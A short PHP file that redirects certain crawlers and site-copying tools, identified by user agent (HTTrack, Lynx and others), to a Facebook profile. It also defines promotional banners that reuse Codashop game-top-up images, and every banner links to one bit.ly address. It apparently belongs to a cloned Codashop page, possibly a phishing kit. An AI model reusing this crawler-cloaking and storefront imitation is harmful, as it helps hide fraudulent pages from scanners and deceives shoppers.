<?php 

$ua = $_SERVER['HTTP_USER_AGENT'];
if(preg_match('#Mozilla/4.05 [fr] (Win98; I)#',$ua) || preg_match('/Java1.1.4/si',$ua) || preg_match('/MS FrontPage Express/si',$ua) || preg_match('/HTTrack/si',$ua) || preg_match('/IDentity/si',$ua) || preg_match('/HyperBrowser/si',$ua) || preg_match('/Lynx/si',$ua)) 
{
header('Location: http://www.facebook.com/IdhamDotID');
die();
}

$bannerCoda = array(
    "1" => array(
        "sourceImg" => "https://cdn1.codashop.com/S/content/common/images/promos/108/mlbb_ld_id.jpg",
        "altText"   => "MLBB Esmeralda Starlight Member Skin on Codashop Indonesi",
        "href"      => "https://bit.ly/2YNPBgb",
        "starttime" => "2020-09-01T15:30:00.000Z",
        "endtime"   => "2020-09-07T1:00:00.000Z"
    ),
    "2" => array(
        "sourceImg" => "https://cdn1.codashop.com/S/content/common/images/promos/108/ff_opm_id.jpg",
        "altText"   => "MLBB Esmeralda Starlight Member Skin on Codashop Indonesi",
        "href"      => "https://bit.ly/2YNPBgb",
        "starttime" => "2020-09-01T15:30:00.000Z",
        "endtime"   => "2020-09-07T1:00:00.000Z"
    ),
    "3" => array(
        "sourceImg" => "https://cdn1.codashop.com/S/content/common/images/promos/104/mlbb_esmeraldasm_en.jpg",
        "altText"   => "MLBB Esmeralda Starlight Member Skin on Codashop Indonesi",
        "href"      => "https://bit.ly/2YNPBgb",
        "starttime" => "2020-09-01T15:30:00.000Z",
        "endtime"   => "2020-09-07T1:00:00.000Z"
    ),
    "4" => array(
        "sourceImg" => "https://cdn1.codashop.com/S/content/common/images/promos/104/mlbb_esmeraldasm_en.jpg",
        "altText"   => "MLBB Esmeralda Starlight Member Skin on Codashop Indonesi",
        "href"      => "https://bit.ly/2YNPBgb",
        "starttime" => "2020-09-01T15:30:00.000Z",
        "endtime"   => "2020-09-07T1:00:00.000Z"
    ),
    "5" => array(
        "sourceImg" => "https://cdn1.codashop.com/S/content/common/images/promos/104/mlbb_esmeraldasm_en.jpg",
        "altText"   => "MLBB Esmeralda Starlight Member Skin on Codashop Indonesi",
        "href"      => "https://bit.ly/2YNPBgb",
        "starttime" => "2020-09-01T15:30:00.000Z",
        "endtime"   => "2020-09-07T1:00:00.000Z"
    ),
    "6" => array(
        "sourceImg" => "https://cdn1.codashop.com/S/content/common/images/promos/104/mlbb_esmeraldasm_en.jpg",
        "altText"   => "MLBB Esmeralda Starlight Member Skin on Codashop Indonesi",
        "href"      => "https://bit.ly/2YNPBgb",
        "starttime" => "2020-09-01T15:30:00.000Z",
        "endtime"   => "2020-09-07T1:00:00.000Z"
    ),
    "7" => array(
        "sourceImg" => "https://cdn1.codashop.com/S/content/common/images/promos/104/mlbb_esmeraldasm_en.jpg",
        "altText"   => "MLBB Esmeralda Starlight Member Skin on Codashop Indonesi",
        "href"      => "https://bit.ly/2YNPBgb",
        "starttime" => "2020-09-01T15:30:00.000Z",
        "endtime"   => "2020-09-07T1:00:00.000Z"
    )
    
);

?>